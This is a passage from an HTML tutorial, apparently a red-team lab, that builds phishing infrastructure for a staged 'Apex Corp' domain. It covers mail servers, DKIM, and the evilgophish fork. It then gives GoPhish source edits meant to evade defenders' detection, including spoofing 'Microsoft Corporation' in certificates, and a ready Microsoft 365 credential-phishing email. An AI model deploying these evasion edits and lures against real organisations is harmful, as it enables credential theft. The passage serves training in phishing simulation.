+                    <code><span class="prompt">$</span> nano /etc/dovecot/conf.d/10-mail.conf</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/conf.d/10-mail.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>mail_location = maildir:/var/mail/vhosts/%d/%n</code>
+                    <code>mail_privileged_group = mail</code>
+                </div>
+            </div>
+
+            <p><strong>Configure authentication:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/dovecot/conf.d/10-auth.conf</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/conf.d/10-auth.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>disable_plaintext_auth = yes</code>
+                    <code>auth_mechanisms = plain login</code>
+                    <code></code>
+                    <code># Comment out system auth:</code>
+                    <code>#!include auth-system.conf.ext</code>
+                    <code></code>
+                    <code># Enable passwd-file:</code>
+                    <code>!include auth-passwdfile.conf.ext</code>
+                </div>
+            </div>
+
+            <p><strong>Create the passwd-file auth config:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/dovecot/conf.d/auth-passwdfile.conf.ext</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/conf.d/auth-passwdfile.conf.ext</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>passdb {</code>
+                    <code>  driver = passwd-file</code>
+                    <code>  args = scheme=SHA512-CRYPT /etc/dovecot/users</code>
+                    <code>}</code>
+                    <code></code>
+                    <code>userdb {</code>
+                    <code>  driver = static</code>
+                    <code>  args = uid=5000 gid=5000 home=/var/mail/vhosts/%d/%n</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p><strong>Create all users at once:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> HASH=</code>
+                    <code><span class="prompt">$</span> for user in t.stark h.campbell homelander security it-helpdesk noreply; do</code>
+                    <code><span class="prompt">$</span>   echo @apex-corp.xyz:</code>
+                    <code><span class="prompt">$</span> done &gt; /etc/dovecot/users</code>
+                    <code><span class="prompt">$</span> chmod 600 /etc/dovecot/users</code>
+                    <code><span class="prompt">$</span> chown dovecot:dovecot /etc/dovecot/users</code>
+                </div>
+            </div>
+
+            <p><strong>Configure SSL:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/dovecot/conf.d/10-ssl.conf</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/conf.d/10-ssl.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>ssl = required</code>
+                    <code>ssl_cert = &lt;/etc/letsencrypt/live/mail.apex-corp.xyz/fullchain.pem</code>
+                    <code>ssl_key = &lt;/etc/letsencrypt/live/mail.apex-corp.xyz/privkey.pem</code>
+                    <code>ssl_min_protocol = TLSv1.2</code>
+                    <code>ssl_prefer_server_ciphers = yes</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p>The &lt; before the path is not a typo. Dovecot uses &lt; to mean read from file. Do not remove it.</p>
+            </blockquote>
+
+            <p><strong>Disable plain IMAP &mdash; only allow IMAPS on port 993:</strong></p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/dovecot/conf.d/10-master.conf</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/dovecot/conf.d/10-master.conf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>service imap-login {</code>
+                    <code>  inet_listener imap {</code>
+                    <code>    port = 0</code>
+                    <code>  }</code>
+                    <code>  inet_listener imaps {</code>
+                    <code>    port = 993</code>
+                    <code>    ssl = yes</code>
+                    <code>  }</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl restart dovecot</code>
+                    <code><span class="prompt">$</span> systemctl enable dovecot</code>
+                    <code><span class="prompt">$</span> openssl s_client -connect mail.apex-corp.xyz:993</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/dovecatimapconfigworkings.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/dovecatimapconfigworkings.png" alt="Dovecot IMAP Working">
+                </a>
+                <figcaption>Figure 20: Dovecot IMAP configuration working correctly.</figcaption>
+            </figure>
+
+                        <hr>
+
+            <h3>Step 1.8 &mdash; Install Roundcube</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install apache2 php php-mysql php-curl php-json php-mbstring php-xml php-zip php-intl php-ldap -y</code>
+                    <code><span class="prompt">$</span> apt install mariadb-server -y</code>
+                    <code><span class="prompt">$</span> mysql_secure_installation</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> mysql -u root -p</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> MySQL</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>CREATE DATABASE roundcube;</code>
+                    <code>CREATE USER 'roundcube'@'localhost' IDENTIFIED BY 'YourStrongPassword';</code>
+                    <code>GRANT ALL PRIVILEGES ON roundcube.* TO 'roundcube'@'localhost';</code>
+                    <code>FLUSH PRIVILEGES;</code>
+                    <code>EXIT;</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CreateRouncubeDatabase.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CreateRouncubeDatabase.png" alt="Create Roundcube Database">
+                </a>
+                <figcaption>Figure 21: Creating the Roundcube database and user in MySQL.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> cd /var/www/html</code>
+                    <code><span class="prompt">$</span> wget https://github.com/roundcube/roundcubemail/releases/download/1.6.6/roundcubemail-1.6.6-complete.tar.gz</code>
+                    <code><span class="prompt">$</span> tar -xzf roundcubemail-1.6.6-complete.tar.gz</code>
+                    <code><span class="prompt">$</span> mv roundcubemail-1.6.6 roundcube</code>
+                    <code><span class="prompt">$</span> chown -R www-data:www-data roundcube/</code>
+                </div>
+            </div>
+
+            <p>Run the Roundcube installer through browser: <code>http://YOUR_VPS1_IP/roundcube/installer/</code></p>
+
+            <p>Configure:</p>
+            <ul>
+                <li><strong>IMAP host:</strong> ssl://mail.apex-corp.xyz:993</li>
+                <li><strong>SMTP host:</strong> localhost:25</li>
+                <li><strong>SMTP user:</strong> <em>(leave empty)</em></li>
+                <li><strong>SMTP password:</strong> <em>(leave empty)</em></li>
+            </ul>
+
+            <blockquote>
+                <p>In config/config.inc.php, SMTP user and password must be empty strings ''. If you set any value there, Roundcube tries to authenticate to Postfix and fails.</p>
+            </blockquote>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/PHPservice%20Running.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/PHPservice%20Running.png" alt="PHP Service Running">
+                </a>
+                <figcaption>Figure 22: PHP service running for Roundcube.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.9 &mdash; Set Up Caddy (HTTPS for Roundcube)</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install -y debian-keyring debian-archive-keyring apt-transport-https curl</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | tee /etc/apt/sources.list.d/caddy-stable.list</code>
+                    <code><span class="prompt">$</span> apt update && apt install caddy -y</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/caddy/Caddyfile</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/caddy/Caddyfile</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>mail.apex-corp.xyz {</code>
+                    <code>    root * /var/www/html/roundcube</code>
+                    <code>    php_fastcgi unix//run/php/php8.1-fpm.sock</code>
+                    <code>    file_server</code>
+                    <code>    encode gzip</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl restart caddy</code>
+                    <code><span class="prompt">$</span> systemctl enable caddy</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CaddyServiceisalsoActive.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CaddyServiceisalsoActive.png" alt="Caddy Service Active">
+                </a>
+                <figcaption>Figure 23: Caddy service is active and running.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/homepageApexCorpwithhttpsworking.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/homepageApexCorpwithhttpsworking.png" alt="Homepage with HTTPS">
+                </a>
+                <figcaption>Figure 24: Apex Corp webmail homepage with HTTPS working.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/RoundCubeWorkingSmoothly.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/RoundCubeWorkingSmoothly.png" alt="Roundcube Working">
+                </a>
+                <figcaption>Figure 25: Roundcube webmail working smoothly.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.10 &mdash; Test Email Flow</h3>
+
+            <p>Log into Roundcube at https://mail.apex-corp.xyz (e.g., t.stark@apex-corp.xyz / Password123) and send a test email.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/SendingEmailThroughRoudnCube.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/SendingEmailThroughRoudnCube.png" alt="Sending Email Through Roundcube">
+                </a>
+                <figcaption>Figure 26: Sending an email through Roundcube webmail.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/ReceivedTheMailEasily.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/ReceivedTheMailEasily.png" alt="Received Mail">
+                </a>
+                <figcaption>Figure 27: Received the mail successfully.</figcaption>
+            </figure>
+
+            <p>Any email to @apex-corp.xyz lands in the catch-all inbox. Tested by sending from Gmail &mdash; it arrived:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/ReciecvedThemailfromGmail.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/ReciecvedThemailfromGmail.png" alt="Received Mail from Gmail">
+                </a>
+                <figcaption>Figure 28: Received email from Gmail in the catch-all inbox.</figcaption>
+            </figure>
+
+            <p>When sending from the server to Gmail, it went to spam (expected without DKIM):</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/Reciecved%20mail%20from%20my%20linux.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/Reciecved%20mail%20from%20my%20linux.png" alt="Received Mail from Linux">
+                </a>
+                <figcaption>Figure 29: Email received from the Linux mail server in Gmail spam folder.</figcaption>
+            </figure>
+
+            <p>Gmail showed us why &mdash; it checks SPF and DMARC:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/GmailCheckingDMARCand%20SPF.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/GmailCheckingDMARCand%20SPF.png" alt="Gmail DMARC SPF Check">
+                </a>
+                <figcaption>Figure 30: Gmail showing SPF and DMARC check details.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.11 &mdash; Set Up DKIM</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install opendkim opendkim-tools -y</code>
+                    <code><span class="prompt">$</span> mkdir -p /etc/opendkim/keys/apex-corp.xyz</code>
+                    <code><span class="prompt">$</span> opendkim-genkey -s mail -d apex-corp.xyz -D /etc/opendkim/keys/apex-corp.xyz/</code>
+                    <code><span class="prompt">$</span> chown -R opendkim:opendkim /etc/opendkim/keys/</code>
+                </div>
+            </div>
+
+            <p>Get the public key:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> cat /etc/opendkim/keys/apex-corp.xyz/mail.txt</code>
+                </div>
+            </div>
+
+            <p>Add this as a TXT record in Cloudflare under <code>mail._domainkey.apex-corp.xyz</code>.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DnsRecordDkim.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DnsRecordDkim.png" alt="DKIM DNS Record">
+                </a>
+                <figcaption>Figure 31: Adding the DKIM TXT record in Cloudflare.</figcaption>
+            </figure>
+
+            <p>Wire OpenDKIM to Postfix by adding these lines to /etc/postfix/main.cf:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/postfix/main.cf</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>milter_protocol = 6</code>
+                    <code>milter_default_action = accept</code>
+                    <code>smtpd_milters = inet:localhost:12301</code>
+                    <code>non_smtpd_milters = inet:localhost:12301</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl restart opendkim postfix</code>
+                </div>
+            </div>
+
+            <p>After DKIM, the spam score improved from 15 to around 40 out of 100 (higher is better):</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/emailcheckspamscore.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/emailcheckspamscore.png" alt="Email Spam Score">
+                </a>
+                <figcaption>Figure 32: Email spam score check showing improvement.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/lowspamscore.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/lowspamscore.png" alt="Low Spam Score">
+                </a>
+                <figcaption>Figure 33: Low spam score after DKIM configuration.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 1.12 &mdash; Install GoPhish</h3>
+
+            <p>GoPhish has a special fork built by the Evilginx author that makes both tools work together properly:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> git clone https://github.com/fin3ss3g0d/evilgophish.git</code>
+                    <code><span class="prompt">$</span> cd evilgophish/gophish</code>
+                    <code><span class="prompt">$</span> go build .</code>
+                    <code><span class="prompt">$</span> chmod +x gophish</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DirectoryofGophish.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DirectoryofGophish.png" alt="GoPhish Directory">
+                </a>
+                <figcaption>Figure 34: GoPhish directory after cloning and building.</figcaption>
+            </figure>
+
+            <p>Create a systemd service:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano /etc/systemd/system/gophish.service</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> /etc/systemd/system/gophish.service</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>[Unit]</code>
+                    <code>Description=GoPhish Phishing Framework</code>
+                    <code>After=network.target</code>
+                    <code></code>
+                    <code>[Service]</code>
+                    <code>Type=simple</code>
+                    <code>User=root</code>
+                    <code>WorkingDirectory=/root/evilgophish/gophish</code>
+                    <code>ExecStart=/root/evilgophish/gophish/gophish</code>
+                    <code>Restart=on-failure</code>
+                    <code></code>
+                    <code>[Install]</code>
+                    <code>WantedBy=multi-user.target</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> systemctl daemon-reload</code>
+                    <code><span class="prompt">$</span> systemctl enable gophish</code>
+                    <code><span class="prompt">$</span> systemctl start gophish</code>
+                    <code><span class="prompt">$</span> journalctl -u gophish -n 50</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/GophishPassword.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/GophishPassword.png" alt="GoPhish Password">
+                </a>
+                <figcaption>Figure 35: GoPhish admin password from journal logs.</figcaption>
+            </figure>
+
+            <p>GoPhish admin panel runs on localhost. Forward it over SSH to access from your machine:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal (Local)</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> ssh -L 3333:127.0.0.1:3333 root@YOUR_VPS1_IP</code>
+                </div>
+            </div>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/Forwadingporttohost.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/Forwadingporttohost.png" alt="Port Forwarding">
+                </a>
+                <figcaption>Figure 36: Forwarding GoPhish admin port to local machine.</figcaption>
+            </figure>
+
+            <p>Open https://127.0.0.1:3333 in your browser and log in.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/GophishDashboard.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/GophishDashboard.png" alt="GoPhish Dashboard">
+                </a>
+                <figcaption>Figure 37: GoPhish admin dashboard.</figcaption>
+            </figure>
+
+                        <hr>
+
+            <h3>Step 1.13 &mdash; GoPhish OPSEC Modifications</h3>
+
+            <blockquote>
+                <p>Do all of these BEFORE running go build. They remove GoPhish fingerprints that defenders and email security tools scan for.</p>
+            </blockquote>
+
+            <p><strong>G1 &mdash; Remove X-Gophish headers</strong></p>
+
+            <p>In controllers/api/util.go, find and remove:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>w.Header().Set(X-Gophish-Contact, ...)</code>
+                    <code>w.Header().Set(X-Gophish-Signature, ...)</code>
+                </div>
+            </div>
+
+            <p><strong>G2 &mdash; Change the server name</strong></p>
+
+            <p>In config/config.go:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>const ServerName = IGNORE   // was gophish</code>
+                </div>
+            </div>
+
+            <p><strong>G3 &mdash; Change the admin port</strong></p>
+
+            <p>In config.json:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> JSON</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>admin_server: {</code>
+                    <code>    listen_url: 127.0.0.1:60002</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p><strong>G8 &mdash; Custom 404 response</strong></p>
+
+            <p>In controllers/phish.go:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>func customNotFound(w http.ResponseWriter, r *http.Request) {</code>
+                    <code>    http.Error(w, Try again!, http.StatusNotFound)</code>
+                    <code>}</code>
+                    <code>// Replace all: http.NotFound(w, r) with customNotFound(w, r)</code>
+                </div>
+            </div>
+
+            <p><strong>G9 &mdash; Better robots.txt</strong></p>
+
+            <p>In controllers/phish.go:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>func (ps *PhishingServer) RobotsHandler(w http.ResponseWriter, r *http.Request) {</code>
+                    <code>    fmt.Fprintln(w, User-agent: *\nDisallow: /*/*\nDisallow: /.git/*)</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p><strong>G10 &mdash; Rename the tracking parameter</strong></p>
+
+            <p>Search for rid in controllers/phish.go and rename to something custom like ref or src. Match the same rename in Evilginx source.</p>
+
+            <p><strong>G12 &mdash; Change certificate organisation</strong></p>
+
+            <p>In util/util.go:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>Organization: []string{Microsoft Corporation},   // was Gophish</code>
+                </div>
+            </div>
+
+            <p>Rebuild after all modifications:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> cd gophish</code>
+                    <code><span class="prompt">$</span> go build .</code>
+                    <code><span class="prompt">$</span> chmod +x gophish</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 1.14 &mdash; Set Up the GoPhish Campaign</h3>
+
+            <p><strong>Sending Profile:</strong></p>
+            <ul>
+                <li>From: IT Security Team &lt;security@apex-corp.xyz&gt;</li>
+                <li>Host: localhost:25</li>
+                <li>Username: (empty)</li>
+                <li>Password: (empty)</li>
+            </ul>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CreatingSMtpProfileForSendingPhsihgnmails.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CreatingSMtpProfileForSendingPhsihgnmails.png" alt="SMTP Sending Profile">
+                </a>
+                <figcaption>Figure 38: Creating SMTP sending profile in GoPhish.</figcaption>
+            </figure>
+
+            <p><strong>Target Group:</strong></p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/ApexCorpmembersinsideGophish.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/ApexCorpmembersinsideGophish.png" alt="Target Group">
+                </a>
+                <figcaption>Figure 39: Apex Corp members inside GoPhish target group.</figcaption>
+            </figure>
+
+            <p><strong>Email Template:</strong></p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CreatingTemplate.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CreatingTemplate.png" alt="Email Template">
+                </a>
+                <figcaption>Figure 40: Creating the phishing email template.</figcaption>
+            </figure>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Email Template</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>Subject: [Action Required] Verify Your Account After Security Migration</code>
+                    <code></code>
+                    <code>Hi {{.FirstName}},</code>
+                    <code></code>
+                    <code>As part of our recent infrastructure migration, all employee accounts</code>
+                    <code>need to be re-verified to ensure continued access to Microsoft 365 services.</code>
+                    <code></code>
+                    <code>This is a mandatory step and must be completed within 48 hours.</code>
+                    <code></code>
+                    <code>Please click the link below to verify your identity:</code>
+                    <code></code>
+                    <code>    [Verify My Account] - {{.URL}}</code>
+                    <code></code>
+                    <code>If you did not request this, contact the IT Help Desk immediately.</code>
+                    <code></code>
+                    <code>Best regards,</code>
+                    <code>Apex Corp IT Security Team</code>
+                </div>
+            </div>
+
+            <p><strong>Launch the campaign:</strong></p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/Launched%20The%20Campagin.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/Launched%20The%20Campagin.png" alt="Launch Campaign">
+                </a>
+                <figcaption>Figure 41: Launching the GoPhish campaign.</figcaption>
+            </figure>
+
+            <p>GoPhish shows a real-time timeline &mdash; who got the email, who opened it, who clicked.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CampaignTemplate.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CampaignTemplate.png" alt="Campaign Timeline">
+                </a>
+                <figcaption>Figure 42: GoPhish campaign timeline showing real-time activity.</figcaption>
+            </figure>
+
+            <p>All phishing emails arrived in the inbox (catch-all working):</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/Arrived%20the%20phishignmails.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/Arrived%20the%20phishignmails.png" alt="Phishing Emails Arrived">
+                </a>
+                <figcaption>Figure 43: Phishing emails arrived in the Roundcube inbox.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/theemail.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/theemail.png" alt="Phishing Email">
+                </a>
+                <figcaption>Figure 44: The phishing email as seen in Roundcube.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h2 id="part2">4. Part 2 &mdash; VPS 2: Evilginx + Caddy</h2>
+
+            <h3>Step 2.1 &mdash; Provision the Second VPS</h3>
+
+            <p>Create another Droplet on DigitalOcean:</p>
+
+            <ul>
